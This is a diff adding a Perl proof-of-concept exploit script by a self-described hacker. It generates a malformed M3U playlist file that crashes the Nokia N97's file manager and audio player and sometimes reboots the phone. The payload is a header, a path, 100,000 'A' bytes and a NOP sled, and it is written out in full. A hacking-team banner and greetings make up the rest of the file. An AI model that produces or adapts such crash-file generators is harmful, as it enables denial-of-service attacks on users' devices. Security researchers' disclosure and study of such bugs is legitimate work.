@@ -1,0 +1,54 @@
+#!/usr/bin/perl
+
+###
+# Title : Nokia N97 (PlayList M3U) Crash PoC
+# Author : KedAns-Dz
+# E-mail : ked-h@hotmail.com
+# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
+# Twitter page : twitter.com/kedans
+# platform : hardware 
+# Impact : Crashs & Reboot (Some Times Rebooted )
+# Tested on : Nokia N97 v 22.0.110 ( Type RM-505)
+# Target :  N97 Mobile
+###
+# Note : BAC 2011 Enchallah ( Me & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
+###
+# Usage : Run the (Gestionn de Fichiers)  And Open The (m3u) File with 'Lect.Audio'
+#        ==> The (Gestionn de Fichiers) and ( Lect.Audio) is Blocked And Crashed !! 
+###
+# ------------
+#START SYSTEM /root@MSdos/ :
+system("title KedAns-Dz");
+system("color 1e");
+system("cls");
+print "\n\n";            
+print "    |===========================================================|\n";
+print "    |= [!] Name : Nokia N97 (PlayList M3U) vApp 22.0.11        =|\n";
+print "    |= [!] Exploit : Local Crash PoC                           =|\n";
+print "    |= [!] Author : KedAns-Dz                                  =|\n";
+print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n";
+print "    |===========================================================|\n";
+sleep(2);
+print "\n";
+my $file = "n97.m3u";
+my $Header = "#M3U\n"; # Header Format M3U 
+my $ccq = "\x4d\x75\x73\x69\x63\x5c"; # Stock32Gb:\...\Music\  << you are can change this 
+my $junk = "\x41" x 100000 ; # Junk
+my $nop = "\x90" x 55 ; # !| Nop |! x 55 
+open($FILE,">$file");
+print $FILE $Header.$ccq.$junk.$nop ; # Evil File
+close($FILE) ;
+print "\n[!] Creating $file file...\n";
+print "\n[+] File successfully created!\n";
+
+#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
+# GreetZ to : Islampard * Dr.Ride * Zaki.Eng * BadR0 * NoRo FouinY * Red1One
+# XoreR * Mr.Dak007 * Hani * TOnyXED * Fox-Dz * Massinhou-Dz ++ all my friends ;
+# > Algerians <  [D] HaCkerS-StreeT-Team [Z] > Hackers <
+# My Friends on Facebook : Nayla Festa * Dz_GadlOl * MatmouR13 ...all Others
+# 4nahdha.com : TitO (Dr.Ride) *  MEN_dz * Mr.LAK (Administrator) * all members ...
+# sec4ever.com members Dz : =>>
+#  Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz ... all Others
+# hotturks.org : TeX * KadaVra ... all Others
+# Kelvin.Xgr ( kelvinx.net)
+#===========================================================================
